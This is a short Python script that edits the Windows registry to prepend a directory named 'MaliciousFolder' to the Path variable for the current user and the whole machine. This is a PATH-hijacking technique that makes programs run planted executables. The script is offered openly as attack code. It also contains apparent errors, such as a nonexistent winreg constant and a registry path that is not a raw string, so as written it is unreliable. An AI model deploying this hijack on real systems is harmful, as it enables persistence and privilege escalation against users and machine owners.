import os, winreg

def readPathValue(reghive, regpath):
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, 0, winreg.KEY_READ)
    index = 0
    while True:
        val = winreg.EnumValue(key, index)
        if val[0].lower() == "path":
            return val[1]
        index += 1

def editPathValue(reghive, regpath, targetdir):
    path = readPathValue(reghive, regpath)
    if targetdir not in path:
        newpath = targetdir + ";" + path
        reg = winreg.ConnectRegistry(None, reghive)
        key = winreg.OpenKey(reg, regpath, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPANDED_SZ, newpath)

targetdir = os.path.join(os.getcwd(), "MaliciousFolder")

for hive, path in [
    (winreg.HKEY_CURRENT_USER, "Environment"),
    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Control\Session Manager\Environment")
]:
    editPathValue(hive, path, targetdir)
